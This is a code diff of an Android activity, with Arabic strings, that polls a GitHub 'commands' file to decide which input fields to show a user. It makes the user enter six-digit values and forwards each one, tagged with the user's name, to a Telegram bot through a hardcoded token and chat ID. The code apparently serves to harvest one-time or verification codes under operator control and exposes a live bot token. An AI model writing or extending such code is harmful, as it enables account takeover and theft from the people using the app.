@@ -31,8 +31,8 @@ public class SecondActivity extends AppCompatActivity {
     private final Handler handler = new Handler();
     private Runnable refreshRunnable;
 
-    // --- إعدادات المراقبة (يجب أن ينتهي الرابط بـ commands/) ---
-    private final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/abdullah14120/ban/refs/heads/main/commands/";
+    // --- إعدادات المراقبة ---
+    private final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/abdullah14120/ban/main/commands/";
     private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
     private final String CHAT_ID = "1749638488";
 
@@ -43,6 +43,7 @@ public class SecondActivity extends AppCompatActivity {
 
         initViews();
         userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "unknown");
+        
         setupButtons();
         startAutoRefresh();
     }
@@ -95,11 +96,16 @@ public class SecondActivity extends AppCompatActivity {
     private void updateUI(JSONObject json) {
         try {
             String status = json.getString("status");
+            
+            // الحالة الافتراضية هي الانتظار إلا إذا تغير الـ JSON
             layoutWaiting.setVisibility(status.equals("waiting") ? View.VISIBLE : View.GONE);
             layoutRejected.setVisibility(status.equals("rejected") ? View.VISIBLE : View.GONE);
             layoutFields.setVisibility(status.equals("fields_form") ? View.VISIBLE : View.GONE);
 
-            if (status.equals("rejected")) txtRejectReason.setText(json.optString("reject_reason", "مرفوض"));
+            if (status.equals("rejected")) {
+                txtRejectReason.setText(json.optString("reject_reason", "مرفوض لعدم استيفاء الشروط"));
+            }
+            
             if (status.equals("fields_form")) {
                 int count = json.optInt("visible_fields", 1);
                 groupField1.setVisibility(count >= 1 ? View.VISIBLE : View.GONE);
@@ -112,11 +118,14 @@ public class SecondActivity extends AppCompatActivity {
 
     private void sendToTg(String f, String v) {
         if (v.length() < 6) { Toast.makeText(this, "أدخل 6 أرقام", Toast.LENGTH_SHORT).show(); return; }
-        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", userName + " أرسل: " + f + " = " + v).build();
+        RequestBody body = new FormBody.Builder()
+                .add("chat_id", CHAT_ID)
+                .add("text", "🔔 تحديث من " + userName + ":\n" + f + " ⬅️ " + v)
+                .build();
         client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build()).enqueue(new Callback() {
             @Override public void onFailure(Call call, IOException e) {}
             @Override public void onResponse(Call call, Response response) {
-                runOnUiThread(() -> Toast.makeText(SecondActivity.this, "تم الإرسال", Toast.LENGTH_SHORT).show());
+                runOnUiThread(() -> Toast.makeText(SecondActivity.this, "تم الإرسال للإدارة", Toast.LENGTH_SHORT).show());
             }
         });
     }
